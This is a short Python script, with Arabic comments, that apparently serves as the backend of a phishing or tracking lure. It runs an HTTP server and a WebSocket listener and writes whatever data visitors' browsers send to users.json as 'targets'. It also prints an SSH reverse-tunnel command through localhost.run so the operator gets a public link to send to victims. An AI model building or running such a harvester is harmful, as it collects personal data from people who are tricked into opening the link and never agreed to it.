import asyncio
import json
import time
import threading
import subprocess
from http.server import HTTPServer, SimpleHTTPRequestHandler
import websockets

USER_FILE = "users.json"
HTTP_PORT = 8000
WS_PORT = 8765

def save_user(user):
    try:
        with open(USER_FILE, 'r') as f: users = json.load(f)
    except: users = []
    users.append(user)
    with open(USER_FILE, 'w') as f: json.dump(users, f, indent=2)

async def ws_handler(ws):
    try:
        data = await ws.recv()
        user = json.loads(data)
        user["time"] = time.strftime("%Y-%m-%d %H:%M:%S")
        save_user(user)
        print("\n[+] Target Found!")
    except: pass

async def start_ws():
    async with websockets.serve(ws_handler, "0.0.0.0", WS_PORT):
        await asyncio.Future()

def start_http():
    server = HTTPServer(("0.0.0.0", HTTP_PORT), SimpleHTTPRequestHandler)
    server.serve_forever()

if __name__ == "__main__":
    # تشغيل السيرفرات في الخلفية
    threading.Thread(target=start_http, daemon=True).start()
    
    print("\n" + "="*40)
    print("[*] Generating Public Link (Please Wait...)")
    print("="*40)

    # فتح نفق تلقائي بدون Ngrok وبدون حساب (باستخدام Localhost.run)
    # ملاحظة: هذا الأمر يحتاج وجود ssh مثبت في جهازك (موجود تلقائياً في أغلب الأنظمة)
    os_command = f"ssh -R 80:localhost:{HTTP_PORT} localhost.run"
    print(f"\n[!] RUN THIS IN A NEW TERMINAL TO GET LINK:")
    print(f"👉 {os_command}")
    print("\n" + "="*40)

    asyncio.run(start_ws())
